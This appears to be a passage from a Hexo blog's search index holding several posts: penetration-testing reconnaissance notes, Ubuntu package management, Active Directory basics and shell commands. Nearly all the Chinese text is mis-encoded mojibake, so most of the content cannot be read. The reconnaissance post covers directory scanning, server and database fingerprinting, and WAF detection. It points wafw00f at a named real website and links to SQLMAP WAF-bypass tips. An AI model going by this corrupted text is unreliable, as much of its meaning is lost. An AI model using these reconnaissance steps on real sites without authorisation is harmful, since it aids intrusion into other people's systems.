å¾¡å‰‘åå°æ‰«æçè—ç‰ˆ wwwscan Spinder.py (è½»é‡çº§å¿«é€Ÿå•ç›®å½•åå°æ‰«æ) Sensitivefilescan (è½»é‡çº§å¿«é€Ÿå•æ–‡ä»¶ç›®å½•åå°æ‰«æ ) Weakfilescan (è½»é‡çº§å¿«é€Ÿå•æ–‡ä»¶ç›®å½•åå°æ‰«æ ) awvs çˆ¬è¡Œ webPathBrute robots.txt å¾ˆå¤šåœ¨çº¿å·¥å…·ï¼š WebScan (http://www.webscan.cc/) 8.ç¤¾ä¼šå·¥ç¨‹å­¦é‚®ä»¶ç¤¾å·¥åº“â€¦â€¦ 9. å…¶ä»– webä¿¡æ¯æœé›†ç½‘ç«™æºç è„šæœ¬ç±»å‹php, java, python, go, node.js, â€¦â€¦ è„šæœ¬ç±»å‹ï¼š urlç›´æ¥æ˜¾ç¤º: xxx.php å¯ä»¥ç›´æ¥åˆ¤æ–­2.å¦‚æœæ˜¯ä¼ªé™æ€ï¼šå¤šæ„é€ è¯·æ±‚æ•°æ®åŒ…ï¼Œf12ï¼Œnetworkä¸­çš„æ•°æ®åŒ…ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚çš„URL(â€¦xxx.jsp)æˆ–è€…æ¥å£â€¦æ¯”å¦‚ï¼šRequest URL: http://www.cngis.cn/news/detail.aspx?classid=216454257090494464&amp;id=140 è¿™é‡Œæ˜¯aspxçš„ ä¼ªé™æ€æ€ä¹ˆæ³¨å…¥æ²¡ç†è§£ï¼Ÿï¼Ÿï¼Ÿä¼ªé™æ€ ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„é™æ€æ ¼å¼æ–‡ä»¶ : å±•ç¤ºçš„æ ¼å¼æ˜¯â€¦xxx.htmlæµ‹è¯•æ–¹æ³•ï¼š f12æ‰“å¼€networkï¼ŒæŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ï¼ˆï¼‰ å¤šæäº¤åœ°å€è®¿é—®æŠ“åŒ…åˆ†æ ç½‘ç«™å¯¹åº”æ•°æ®åº“å¸¸ç”¨çš„ç»„åˆåŒ¹é…ï¼š å¦‚phpç¨‹åº åˆ¤å®šmysql aspx åˆ¤å®šmssqlå¸¸è§ç»„åˆï¼š asp+access php+mysql aspx+mssql jsp+mssqlæˆ–oracleç­‰ ç«¯å£æ‰«æåˆ¤å®šï¼šå†…ç½‘æœåŠ¡å™¨æ–¹æ³•å¤±æ•ˆaccessæ— ç«¯å£å¼€å‘ï¼Œ mysql:3306ï¼Œ mssql:1433ï¼Œ oracle:1521ï¼ŒMongoDBï¼š27017,Postgresql:5432, redis:6379ç­‰ å‚è€ƒæ–‡ç« ï¼šhttps://www.cnblogs.com/botoo/p/10475402.html ç½‘ç«™æ­å»ºå¹³å°æŸ¥çœ‹å…ƒç´ æˆ–å®¡æŸ¥å…ƒç´ æŠ“åŒ…è·å–æ¯”å¦‚Server: Nginx, iisç­‰ä¸­é—´ä»¶ä¿¡æ¯ æœåŠ¡å™¨æ“ä½œç³»ç»Ÿå¤§å°å†™åˆ¤æ–­ windowså¤§å°å†™ä¸æ•æ„Ÿ linuxç›¸å æœ‰æ— WAFé˜²æŠ¤å·¥å…·ï¼šå¯ä»¥å€Ÿç”¨ wafw000f è„šæœ¬åˆ¤æ–­wafç±»åˆ«ã€‚ https://github.com/EnableSecurity/wafw00f wafw00f http://www.cngis.cn åº”ç”¨çš„é˜²ç«å¢™ã€ç¡¬ä»¶çš„é˜²ç«å¢™ SQLMAPçš„å‡ ä¸ªWAFç»•è¿‡æ–¹æ³•ï¼š https://9bie.org/index.php/archives/465/ æœ‰æ— å…¶ä»–åº”ç”¨APPæˆ–æ‰‹æœºç«™ç‚¹ ç¬¬ä¸‰æ–¹æ¥å£ï¼ˆå¾®ä¿¡å…¬ä¼—å·ç­‰ï¼‰ IPç½‘æ®µç½‘ç»œä¿¡æ¯ IP : IPå¯¹åº”ç½‘ç«™ IPå¯¹åº”ç›®å½•æ‰«æ ï¼ˆè®¾ç½®çš„æ—¶å€™ï¼Œç›®å½•è®¾ç½®ä¸ºwww.xxx,comã€‚ 192.168.1.112è®¿é—®çš„æ˜¯ç«™ç‚¹ï¼Œä½†æ˜¯www.xxx.comè®¿é—®çš„æ˜¯ç«™ç‚¹ä¸‹é¢çš„ä¸€ä¸ªç›®å½•ã€‚ä¸€ä¸ªipå¯¹åº”å¤šä¸ªåŸŸåå¤šä¸ªç«™ç‚¹ï¼Œå•ä¸€ä¸ªåŸŸååªæœ‰ä¸€ä¸ªipï¼‰ç½‘æ®µï¼š Cæ®µä¿¡æ¯æ‰«æ ç½‘æ®µ 192.168.0.1 -192.168.0.255 åœ¨çº¿Cæ®µæŸ¥è¯¢ï¼ˆæ‹¿åˆ°åŒç½‘æ®µåï¼Œå†è¿›è¡Œå¦ä¸€ä¸ªä¸»æœºï¼Œç›¸å½“äºå†…ç½‘æ¸—é€äº†ï¼‰å·¥å…·: DotNetScan iisputå¢å¼ºç‰ˆ robotsåè®®ç›´æ¥è®¿é—®åœ°å€/robots.txtè·å–ç›¸å…³ç›®å½•åœ°å€ä¿¡æ¯ shodanzoomeyefofa åˆ©ç”¨æœç´¢ã€‚æˆ–è€…è„šæœ¬å¼€å‘è¿›è¡Œæ‰¹é‡/è°ƒç”¨ ä¼ªé™æ€å¦‚æœçœ‹åˆ°ä¸€ä¸ªä»¥.htmlæˆ–è€….htmç»“å°¾çš„ç½‘é¡µï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡å‘¢åœ¨åœ¨åœ°å€è¾“å…¥æ¡†ä¸­è¾“å…¥ï¼šjavascript:alert(document.lastModified)ï¼Œæ¥å¾—åˆ°ç½‘é¡µæœ€åçš„ä¿®æ”¹æ—¶é—´ï¼Œå¦‚æœå¾—åˆ°çš„æ—¶é—´å’Œç°åœ¨æ—¶é—´ä¸€è‡´ï¼Œæ­¤é¡µé¢å°±æ˜¯ä¼ªé™æ€ï¼Œåä¹‹æ˜¯çœŸé™æ€ï¼›å› ä¸ºåŠ¨æ€é¡µé¢çš„æœ€åä¿®æ”¹æ—¶é—´æ€»æ˜¯å½“å‰æ—¶é—´ï¼Œè€Œé™æ€é¡µé¢çš„æœ€åä¿®æ”¹æ—¶é—´åˆ™æ˜¯å®ƒç”Ÿæˆçš„æ—¶é—´ã€‚ https://blog.csdn.net/Fly_hps/article/details/79487137 https://blog.csdn.net/zezai3010/article/details/78797944 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server åŒ…ç®¡ç†]]></title>
    <url>%2Fposts%2Fb9efd53%2F</url>
    <content type="text"><![CDATA[DPKGåŒ…ç®¡ç†å™¨ï¼ˆæœ¬åœ°ï¼‰ â€‹ dpkg -l å¯¼å‡ºè½¯ä»¶åŒ…ï¼Œåœ¨æ–°ç³»ç»Ÿä¸Šå®‰è£…dpkg -L xxd æŸ¥çœ‹æŸä¸ªè½¯ä»¶åŒ…åœ¨ç”µè„‘ä¸ŠåŒ…å«å“ªäº›æ–‡ä»¶dpkg -S /usr/.../man1 çœ‹è¿™ä¸ªæ–‡ä»¶æ¥è‡ªå“ªä¸ªè½¯ä»¶åŒ…dpkg -i xxxname_version_æ¶æ„.deb å®‰è£… // æ¶æ„(amd64, i386)dpkg --print-architecture æŸ¥çœ‹ç³»ç»Ÿçš„æ”¯æŒçš„æ¶æ„dpkg --print-foreign-architectures æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦æ”¯æŒå…¶ä»–çš„æ¶æ„ cat /var/lib/dpkg/arch æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦å¯ä»¥æ‹“å±•æ”¯æŒå…¶ä»–æ¶æ„ç±»å‹ å¯ä»¥è®©ç³»ç»Ÿæ”¯æŒå…¶ä»–ç±»å‹æ¶æ„dpkg --remove-architecture i386 åˆ é™¤æ”¯æŒæŸä¸ªæ¶æ„ dpkg -r name:amd64 å¸è½½è½¯ä»¶åŒ…ï¼ˆå¯ä»¥å¸¦ä¸Šæ¶æ„ï¼‰ ä¸åˆ é™¤é…ç½®æ–‡ä»¶dpkg -P name å¸è½½å¹¶åˆ é™¤é…ç½® APTåŒ…ç®¡ç†å™¨# æºæ–‡ä»¶ cat /etc/apt/sources.list | grep -v ^# ä¸æ˜¾ç¤º#å·å¼€å¤´çš„ /etc/apt/sources.list.d/ ç›®å½•ä¸‹é¢æ˜¯ç¬¬ä¸‰æ–¹çš„è½¯ä»¶æº sudo apt upgrade # å¯¹å·²ç»å®‰è£…çš„åŒ…æ›´æ–° sudo apt dist-upgrade # æ›´æ–°æ–°åŒ…ï¼Œåˆ é™¤æ—§åŒ…ï¼ˆåŒ…å«å†…æ ¸ï¼‰ sudo apt remove nmap --purge # åˆ é™¤åŒ…å’Œé…ç½®æ–‡ä»¶ -- /var/log/dpkg.log apt list --upgradeable # æŸ¥çœ‹å¯ä»¥æ›´æ–°çš„åŒ… apt serach 'network mapper' # æœç´¢ sudo apt show nmap # æŸ¥çœ‹è½¯ä»¶åŒ…è¯¦ç»†æè¿° # å¸è½½, å¸è½½å®Œæˆä¹‹åå†æŠŠä¸ç”¨çš„autoremoveç­‰ sudo apt remove nmap --purge sudo apt purge nmap sudo apt autoremove # è°¨æ…ä½¿ç”¨ï¼ï¼ï¼ï¼ˆæŸç³»æ–‡ä»¶å¯èƒ½æ˜¯æ—§ç‰ˆå†…æ ¸çš„ä¾èµ–åŒ…ï¼Œå¦‚æœå›é€€è€ç‰ˆæœ¬å¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼‰ /var/cache/apt/archives # ä¸‹è½½åˆ°è¿™é‡Œæ¥äº†ï¼ˆé‡Œé¢ä¸éœ€è¦çš„debåŒ…å¯ä»¥åˆ é™¤ã€‚åªæ˜¯ä¸‹æ¬¡å†æ¬¡éœ€è¦çš„æ—¶å€™é‡æ–°ä¸‹è½½ï¼‰ /var/lib/apt/ # æ›´æ–°æºçš„ç´¢å¼•æ–‡ä»¶.list # .deb æ˜¯æ‰“åŒ…å¥½çš„ï¼Œä¸æ˜¾ç¤ºæºä»£ç  apt download nmap # ä¸‹è½½ä½†æ˜¯ä¸å®‰è£…(.debåŒ…) apt source asw # æŠŠæºä»£ç ä¸‹è½½ä¸‹æ¥ï¼Œå¯ä»¥å¯ä»¥ä¸‹è½½ä¹‹åè‡ªå·±ç¼–è¯‘å®‰è£… apt showsrc nmap # æŸ¥çœ‹æºä»£ç  è‡ªåŠ¨æ›´æ–°ï¼ˆæ— äººå€¼å®ˆï¼‰sudo apt install unattended-upgrades # é…ç½®ä¸»é…ç½®æ–‡ä»¶ /etc/apt/apt.conf.d/50unattended-upgrades å…è®¸ï¼šä¸€èˆ¬åªå…è®¸securityé‚£ä¸ª é»‘åå•ï¼š # é…ç½®æ–‡ä»¶2 /etc/apt/apt.conf.d/10periodic æ›´æ–°/ä¸‹è½½/æ¸…é™¤/å®‰è£… å‘¨æœŸ # é‡å¯æœåŠ¡ sudo service unattended-upgrades restart sudo systemctl restart unattended-upgrades.service # æ–°ç‰ˆæœ¬ubuntuæ¨è # æ—¥å¿— cat /var/log/unattended-upgrades/unattended-upgrades-xxxxxxxx.log sudo lsb_release -a # æŸ¥çœ‹ç‰ˆæœ¬å’Œcode_name æ— äººå€¼å®ˆæ›´æ–°é€šçŸ¥# é…ç½®æ–‡ä»¶ /etc/apt/apt.conf.d/50unattended-upgradesä¸­çš„mailï¼ŒæŒ‡å®šé‚®ç®± # apticronè½¯ä»¶åŒ…ï¼Œç”¨æ¥å‘é‚®ä»¶çš„ sudo pt install apticron å¤šæ‰‹åŠ¨ç»ƒä¹ ï¼Œå°‘å¤åˆ¶ APTæ›´æ–°æºé…ç½®æ¨èä½¿ç”¨å®˜æ–¹æ›´æ–°æº deb æŒ‡çš„æ˜¯å®‰è£…åŒ…æ–‡ä»¶deb-src æ˜¯debç›¸å…³çš„ï¼Œè¿˜æ²¡æœ‰ç¼–è¯‘æˆdebçš„æºæ–‡ä»¶ ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå°½é‡ç”¨å‰ä¸¤ç§ç±»å‹çš„ ç¬¬ä¸‰æ–¹åº“ apt-key addapt-ket del PPA SNAPåŒ…ç®¡ç† å‘å±•è¶‹åŠ¿éå¸¸å¥½ SNAPåŒ…ç®¡ç†å¯ä»¥å…ˆå®‰è£…snap: apt install snap sudo snap find nmap sudo snap install nmap sudo snap remove sudo snap sudo snap refesh nmap # æ›´æ–°å•ä¸ªè½¯ä»¶åŒ… sudo snap refresh # æ›´æ–°ç´¢å¼•æ–‡ä»¶ # åŒæ—¶å®‰è£…å¤šä¸ªè½¯ä»¶åŒ…ï¼ˆå½¼æ­¤ç‹¬ç«‹ï¼‰ # ä½œä¸ºaptçš„è¡¥å…… # snapçš„è½¯ä»¶åŒ…ä¼šä¸‹è½½åˆ°ä¸€ä¸ªç›®å½•ï¼š /snap/bin/... document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å†…ç½‘ç¬¬ä¸€ç«  - å†…ç½‘åŸºç¡€çŸ¥è¯†]]></title>
    <url>%2Fposts%2F7e7ba1a0%2F</url>
    <content type="text"><![CDATA[åŸºç¡€çŸ¥è¯† å·¥ä½œç»„ ç±»ä¼¼ä¸€ä¸ªç¤¾å›¢ï¼Œä¸å­˜åœ¨é›†ä¸­ç®¡ç†ï¼Œæ— æœåŠ¡æœºä¸å®¢æˆ·æœºä¹‹åˆ†ï¼Œæ˜¯å¯¹ç­‰çš„ å°†ä¸åŒçš„è®¡ç®—æœºæŒ‰åŠŸèƒ½ï¼ˆæˆ–éƒ¨é—¨ï¼‰åˆ†åˆ«åˆ—å…¥ä¸åŒçš„å·¥ä½œç»„ä¸­ å®ä¾‹ï¼šåŠ å…¥/æ›´æ”¹/é€€å‡º å·¥ä½œç»„ï¼š è®¡ç®—æœº- å±æ€§- è®¡ç®—æœºå- æ›´æ”¹è®¾ç½®- å·¥ä½œç»„æ›´æ”¹- ï¼ˆä¿®æ”¹åç§°ã€‚è‹¥æ²¡æœ‰è¿™ä¸ªå·¥ä½œç»„ä¼šæ–°å»ºï¼‰- é‡å¯ åŸŸåŸŸ(Domain)ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼ˆå®‰å…¨è¾¹ç•Œï¼š æ˜¯æŒ‡åœ¨ä¸¤ä¸ªåŸŸä¸­ï¼Œä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­ç¬¬èµ„æºï¼‰ï¼Œå¯ä»¥ç†è§£ä¸ºå‡çº§ç‰ˆçš„â€œå·¥ä½œç»„â€ åŸŸæ§åˆ¶å™¨(Domain Controller, ç®€å†™ä¸ºDC)ä¸€ä¸ªåŸŸä¸­ä¸€ä¸ªç±»ä¼¼ç®¡ç†æœåŠ¡å™¨çš„è®¡ç®—æœºï¼Œç›¸å½“äºå•ä½çš„é—¨å«ä¸€æ ·ï¼ŒåŸŸå†…ç”µè„‘å¦‚æœæƒ³äº’ç›¸è®¿é—®ï¼Œé¦–å…ˆéƒ½æ˜¯ç»è¿‡å®ƒçš„å®¡æ ¸ åŸŸçš„åˆ†ç±» å•åŸŸ ï¼ˆå›ºå®šä½ç½®çš„å°å…¬å¸ã€‚ä¸€ä¸ªyuå†…è¦å»ºç«‹è‡³å°‘ä¸¤ä¸ªDCï¼Œä¸€ä¸ªä½œä¸ºå¤‡ä»½DCï¼‰ çˆ¶åŸŸã€å­åŸŸ ï¼ˆæ¯”å¦‚ä¸€ä¸ªå¤§å…¬å¸ï¼Œæœ‰åˆ†å…¬å¸ï¼›ä¸åŒåœ°ç†ä½ç½®åˆ†å…¬å¸ï¼›å­å…¬å¸å¯ä»¥é€šè¿‡è‡ªå·±çš„åŸŸç®¡ç†è‡ªå·±çš„èµ„æºï¼› å‡ºäºå®‰å…¨ç­–ç•¥ï¼‰ åŸŸæ•°(tree) åŸŸæ£®æ—(forest) DNSåŸŸåæœåŠ¡å™¨ (å®é™…ä¸Šï¼ŒåŸŸçš„nameå°±æ˜¯DNSåŸŸçš„nameï¼› é€šå¸¸dnsæœåŠ¡å™¨ä¸DCS æ˜¯ä¸€å°æœºå™¨) æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼ŒADï¼‰æ˜¯æŒ‡åŸŸç¯å¢ƒä¸­æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶ã€‚ ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿç›®å½•å°±æ˜¯å­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡ï¼ˆå¦‚ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€å…±äº«èµ„æºã€æ‰“å°æœºå’Œè”ç³»äººç­‰ï¼‰çš„ä¿¡æ¯ã€‚ç›®å½•æœåŠ¡æ˜¯æŒ‡å¸®åŠ©ç”¨æˆ·å¿«é€Ÿã€å‡†ç¡®åœ°ä»ç›®å½•ä¸­æ‰¾åˆ°å…¶æ‰€éœ€è¦çš„ä¿¡æ¯çš„æœåŠ¡ã€‚æ´»åŠ¨ç›®å½•å®ç°äº†ç›®å½•æœåŠ¡ï¼Œä¸ºä¼ä¸šæä¾›äº†ç½‘ç»œç¯å¢ƒçš„é›†ä¸­å¼ç®¡ç†æœºåˆ¶ æ´»åŠ¨ç›®å½•ç›¸å½“äºå­—å…¸çš„ç´¢å¼•ï¼Œå³æ´»åŠ¨ç›®å½•é‡Œçš„èµ„æºå°±æ˜¯å­—å…¸èµ„æºçš„å¿«æ·æ–¹å¼ï¼Œç”¨æˆ·é€šè¿‡å¯»æ‰¾å¿«æ·æ–¹å¼è€Œå®šä½èµ„æº é€»è¾‘ç»“æ„ç»„ç»‡å¯¹è±¡çš„åšæ³•ä¸è€ƒè™‘è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®çš„ç»„ç»‡æ¡†æ¶ æ´»åŠ¨ç›®å½•çš„é€»è¾‘ç»“æ„å°±åŒ…æ‹¬ï¼š ç»„ç»‡å•å…ƒ(ou)ã€åŸŸ(domain)ã€åŸŸæ ‘(tree)ã€åŸŸæ£®æ—(forest) åœ¨åŸŸæ ‘å†…çš„æ‰€æœ‰åŸŸå…±äº«ä¸€ä¸ªæ´»åŠ¨ç›®å½•ï¼Œè¿™ä¸ªæ´»åŠ¨ç›®å½•å†…çš„æ•°æ®åˆ†æ•£çš„å­˜å‚¨åœ¨å„ä¸ªåŸŸå†…ï¼Œä¸”æ¯ä¸ªåŸŸåªå­˜å‚¨è¯¥åŸŸå†…çš„æ•°æ®ã€‚ æ´»åŠ¨ç›®å½•ä¸»è¦åŠŸèƒ½ è´¦å·é›†ä¸­ç®¡ç† è½¯ä»¶é›†ä¸­ç®¡ç† ç¯å¢ƒé›†ä¸­ç®¡ç† å¢å¼ºå®‰å…¨æ€§ æ›´å¯é  æ´»åŠ¨ç›®å½•ä¸ºMicrosoftç»Ÿä¸€ç®¡ç†çš„å¹³å° DCä¸ADæœ€å¤§çš„åŒºåˆ«æ˜¯ï¼šåŸŸæ§åˆ¶å™¨ï¼ˆDCï¼‰ä¸æ´»åŠ¨ç›®å½•ï¼ˆADï¼‰æœ€å¤§çš„åŒºåˆ«æ˜¯ï¼šå¦‚æœç½‘ç»œè§„æ¨¡è¾ƒå¤§ï¼Œå°±è€ƒè™‘æŠŠç½‘ç»œä¸­çš„ä¼—å¤šå¯¹è±¡ï¼Œå¦‚è®¡ç®—æœºã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€æ‰“å°æœºã€å…±äº«æ–‡ä»¶ç­‰ï¼Œåˆ†é—¨åˆ«ç±»ã€äº•ç„¶æœ‰åºåœ°æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“ä¸­ï¼Œå¹¶å°†æ£€ç´¢ä¿¡æ¯æ•´ç†å¥½ï¼Œä»¥ä¾¿æŸ¥æ‰¾ã€ç®¡ç†å’Œä½¿ç”¨è¿™äº›å¯¹è±¡ï¼ˆèµ„æºï¼‰ã€‚è¿™ä¸ªæ‹¥æœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®åº“ï¼Œå°±æ˜¯æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œç®€ç§° AD åº“ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬åº”è¯¥æŠŠè¿™ä¸ªæ•°æ®åº“æ”¾åœ¨å“ªå°è®¡ç®—æœºä¸Šå‘¢ï¼Ÿç”¨äºå­˜å‚¨æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœºç§°ä¸ºDC æ‰€ä»¥ï¼Œè¦å®ç°åŸŸç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è¦å®‰è£… ADã€‚å½“å†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºä¸Šå®‰è£…äº† ADï¼Œå®ƒå°±å˜æˆäº† DC å®‰å…¨åŸŸç›®çš„ï¼š å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ç½‘æ®µå†… DMZâ€œéš”ç¦»åŒºâ€ï¼Œ â€œéå†›äº‹åŒ–åˆ†åŒºâ€ï¼Œ ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œè´¹æ­¦å™¨çš„é—®é¢˜ æ”¾ç½® ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ï¼Œæ¯”å¦‚ï¼šä¼ä¸šwebæœåŠ¡å™¨ã€FTPæœåŠ¡å™¨å’Œè®ºå›ç­‰ æœ‰æ•ˆçš„ä¿æŠ¤äº†å†…éƒ¨ç½‘ç»œ DMZçš„å±éšœåŠŸèƒ½: å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘ å†…ç½‘å¯ä»¥è®¿é—®DMZ å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘ å¤–ç½‘å¯ä»¥è®¿é—®DMZ DMZä¸èƒ½è®¿é—®å¤–ç½‘ DMZä¸èƒ½è®¿é—®å†…ç½‘ åŸŸä¸­è®¡ç®—æœºåˆ†ç±» åŸŸæ§åˆ¶å™¨ æˆå‘˜æœåŠ¡å™¨ å®¢æˆ·æœº ç‹¬ç«‹æœåŠ¡å™¨ å†…æƒé™è§£è¯»åŸŸæœ¬åœ°ç»„ ï¼ˆæ¥è‡ªå…¨æ—ç”¨äºæœ¬åŸŸï¼‰å¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æºï¼ˆè®¿é—®åŒä¸€ä¸ªåŸŸï¼‰ï¼Œä¸èƒ½åµŒå¥—äºå…¶ä»–ç»„ä¸­ï¼Œä¸»è¦æ˜¯ç”¨äºæˆæƒä½äºåŸŸèµ„æºçš„è®¿é—®æƒé™ å…¨å±€ç»„ ï¼ˆæ¥è‡ªæœ¬åŸŸä½œç”¨äºå…¨æ—ï¼‰å•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼ˆå¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸé‡Œé¢çš„ç”¨æˆ·ï¼‰ï¼Œå…¨å±€ç»„åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ é€šç”¨ç»„ ï¼ˆæ¥è‡ªå…¨æ—ä½œç”¨äºå…¨æ—ï¼‰é€šç”¨ç»„æˆå‘˜æ¥è‡ªåŸŸæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–çš„é€šç”¨ç»„ï¼Œå¯ä»¥åœ¨è¯¥åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå¯ä»¥åµŒå¥—äºå…¶ä»–åŸŸç»„ä¸­ã€‚éå¸¸é€‚äºåŸŸæ—ä¸­çš„è·¨åŸŸè®¿é—®ã€‚ A-G-DL-Pç­–ç•¥A - ç”¨æˆ·è´¦å·G - å…¨å±€ç»„U - é€šç”¨ç»„DL - åŸŸæœ¬åœ°ç»„P - èµ„æºæƒé™ A-G-DL-Pç­–ç•¥ æ˜¯å°†ç”¨æˆ·è´¦å·æ·»åŠ åˆ°å…¨å±€ç»„ä¸­ï¼Œè®²å…¨å±€ç»„æ·»åŠ åˆ°åŸŸæœ¬åœ°ç»„ä¸­ï¼Œ ç„¶åä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™ã€‚æŒ‰ç…§AGDLPçš„åŸåˆ™å¯¹ç”¨æˆ·ç»„ç»‡å’Œç®¡ç†èµ·æ¥æ›´å®¹æ˜“ åœ¨AGDLPå½¢æˆä»¥å½“ç»™ä¸€ä¸ªç”¨æˆ·æŸä¸ªæƒé™çš„æ—¶å€™ï¼Œåªè¦æŠŠè¿™ä¸ªç”¨æˆ·å®¶åˆ°æŸä¸€ä¸ªæœ¬åœ°åŸŸç»„å°±å¯ä»¥äº†ã€‚ å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™ åŸŸç®¡ç†å‘˜ç»„ Domain Admins ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ Enterprise Admins æ¶æ„ç®¡ç†å‘˜ç»„ Schema Admins åŸŸç”¨æˆ·ç»„ Domain Users æœ¬åœ°ç»„çš„æƒé™ï¼š Administrators (ç®¡ç†å‘˜ç»„) Remote Desktop USer ï¼ˆè¿œç¨‹ç™»å½•ç»„ï¼‰ Print Operator (æ‰“å°æœºæ“ä½œå‘˜ç»„) Account Operators ï¼ˆè´¦å·æ“ä½œå‘˜ç»„ï¼‰ Server Operater ï¼ˆæœåŠ¡å™¨æ“ä½œå‘˜ç»„ï¼‰ Backup Operators (å¤‡ä»½æ“ä½œå‘˜ç»„ ) åŸŸç¯å¢ƒæ­å»ºWindows 2012 R2 è®¾ç½®IP æ›´æ”¹è®¡ç®—æœºå å®‰è£…åŸŸæ§åˆ¶å™¨å’ŒDNSæœåŠ¡ å‡çº§æœåŠ¡å™¨ åˆ›å»ºActive Directoryç”¨æˆ· Windows7 Windwos7 é€šè¿‡é˜²ç«å¢™Monowallæ„å»ºäºŒçº§å†…ç½‘é˜²ç«å¢™Monowallçš„ä½¿ç”¨å¼€æºï¼ŒåŸºäºè½¯ä»¶çš„é˜²ç«å¢™ï¼Œ åŸºäºWebé¡µé¢ç®¡ç†çš„ ä¸­æ–‡ç‰ˆï¼š www.cat-home.org/?action=show&amp;id=158 ç½‘ç»œé€‚é…å™¨: 2ä¸ªï¼Œ ä¸€ä¸ªNATï¼Œä¸€ä¸ªæ¡¥æ¥ï¼Œç¡¬ç›˜è¦æ±‚ç‰¹åˆ«ä½ï¼› é…ç½®ï¼š document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>å†…ç½‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu server-åŸºç¡€å‘½ä»¤]]></title>
    <url>%2Fposts%2Ff8860a86%2F</url>
    <content type="text"><![CDATA[åŸºæœ¬Shellå¸¸è¯†ctrl + D # ç»“æŸå½“å‰è¾“å…¥ ctrl + c # å¼ºåˆ¶ç»“æŸä¸€åˆ‡ # bash lså‚æ•°:-l -a -d åªæ˜¾ç¤ºç›®å½•è‡ªèº«ä¿¡æ¯ -i æ˜¾ç¤ºinodeä¿¡æ¯ -S æŒ‰æ–‡ä»¶å¤§å°æ’åº -r å€’åº -t æŒ‰ä¿®æ”¹æ—¶é—´æ’åº -h æ–‡ä»¶å¤§å°ä¾¿äºäººç±»é˜…è¯»æ–¹å¼ cpcp file1 file2 cp file1 f2 dir/ å‚æ•°:-R/r æ‹·è´ç›®å½• -l ç¡¬é“¾æ¥æ‹·è´(ls -li) # nodeçš„å€¼æ˜¯ç›¸åŒçš„,å¯¹åº”çš„ç¡¬ç›˜æ•°æ®å—æ˜¯ç›¸åŒçš„,åªæ˜¯å¤šäº†ä¸€ä¸ªæŒ‡å‘ -s è½¯è¿æ¥æ‹·è´ (ls -liæŸ¥çœ‹æ—¶å€™ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯'l') 